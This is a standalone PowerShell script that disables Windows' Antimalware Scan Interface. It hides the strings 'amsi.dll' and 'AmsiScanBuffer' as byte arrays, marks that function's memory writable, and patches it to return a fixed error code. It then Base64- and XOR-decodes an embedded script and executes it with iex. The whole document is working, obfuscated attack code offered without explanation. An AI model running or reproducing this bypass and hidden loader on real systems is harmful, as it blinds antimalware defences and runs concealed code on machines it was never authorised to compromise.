$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "d2R/cmV4fn8xcH1lMWobMTExMUFwY3B8MTkbGzExMTExMTExSkJlY3h/dkw1YWN+dmNwfDEsMTZSK01meH91fmZiTWJoYmV0fCIjTXJ8dT90aXQ2GzExMTE4GxsbMTExMV90ZjxYZXR8MTxBcGV5MTNZWlJEK01CfndlZnBjdE1SfXBiYnRiTXxiPGJ0ZWV4f3ZiTVJkY0d0YzMxPFd+Y3J0GzExMTFCdGU8WGV0fEFjfmF0Y2VoMTEzWVpSRCtNQn53ZWZwY3RNUn1wYmJ0Yk18YjxidGVleH92Yk1SZGNHdGMzMTxfcHx0MTM5dXR3cGR9ZTgzMTxncH1kdDEzMzE8V35jcnQbGzExMTFfdGY8WGV0fDEzWVpSRCtNQn53ZWZwY3RNUn1wYmJ0Yk0/aHR9fmZNQnl0fX1NXmF0f01yfnx8cH91MzE8V35jcnQbMTExMUJ0ZTxYZXR8QWN+YXRjZWgxM1laUkQrTUJ+d2VmcGN0TVJ9cGJidGJNP2h0fX5mTUJ5dH19TV5hdH9Ncn58fHB/dTMxPF9wfHQxMzl1dHdwZH1lODMxPEdwfWR0MTVhY352Y3B8MTxXfmNydBsbMTExMUJ0ZTxYZXR8QWN+YXRjZWgxMTNZWlJEK01CfndlZnBjdE1SfXBiYnRiTXxiPGJ0ZWV4f3ZiTVJkY0d0YzMxPF9wfHQxMzl1dHdwZH1lODMxPGdwfWR0MTM/aHR9fmYzMTxXfmNydBsxMTExQmVwY2U8QWN+cnRiYjEzUitNRnh/dX5mYk1CaGJldHwiI013fnV5dH1hdGM/dGl0MzE8Rnh/dX5mQmVofXQxWXh1dXR/GxsxMTExQmVwY2U8Qn10dGExIhsbMTExMUN0fH5ndDxYZXR8MTNZWlJEK01CfndlZnBjdE1SfXBiYnRiTXxiPGJ0ZWV4f3ZiTTMxPEN0cmRjYnQxPFd+Y3J0GzExMTFDdHx+Z3Q8WGV0fDEzWVpSRCtNQn53ZWZwY3RNUn1wYmJ0Yk0/aHR9fmZNMzE8Q3RyZGNidDE8V35jcnQbbBtwfWUb"

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))
